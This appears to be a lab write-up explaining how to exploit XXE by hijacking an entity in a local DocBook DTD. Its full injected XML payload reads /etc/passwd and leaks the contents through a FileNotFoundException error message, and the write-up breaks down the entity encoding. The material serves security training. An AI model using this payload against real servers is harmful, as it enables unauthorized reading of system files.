# Lab 09: Exploiting XXE by Repurposing a Local DTD (Expert)

### 🎯 Objective
Exfiltrate `/etc/passwd` via an error message by leveraging an existing local DTD file on the server to bypass out-of-band restrictions.

### 🔍 Methodology: Local DTD Repurposing
This is an advanced technique used when:
1.  **Out-of-band (OOB) is blocked:** The server cannot connect to external URLs.
2.  **Internal DTDs are required:** We must find a valid DTD file on the local filesystem and "hijack" one of its entities.

In this lab, we target the `/usr/share/yelp/dtd/docbookx.dtd` file and redefine the `ISOamso` entity to trigger a file-based error.



### 🛠️ Exploitation Process

1.  **The Payload:**
    I injected the following block into the `Check stock` XML request. This block references the local Yelp DTD and redefines `ISOamso` to include our malicious logic:

    ```xml
    <!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
    <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
    '>
    %local_dtd;
    ]>
    ```

2.  **Breakdown of Nesting:**
    * `&#x25;`: Decodes to `%`. Used to define a parameter entity inside another entity.
    * `&#x26;#x25;`: A double-encoded `%` (`&` + `#x25`). Necessary because it passes through multiple levels of XML parsing before it's executed.
    * `&#x27;`: Single quote (`'`).

3.  **Execution:**
    When the parser loads `%local_dtd;`, it looks for `ISOamso`. Since we already defined it, the parser uses our version, which:
    - Reads `/etc/passwd`.
    - Tries to access a non-existent file path containing the file's data.
    - Returns the content in the error message.

### 🚩 Result
- **Evidence:** The server returned a `java.io.FileNotFoundException` containing the full content of `/etc/passwd`.
- **Status:** ✅ Solved (Expert Level)
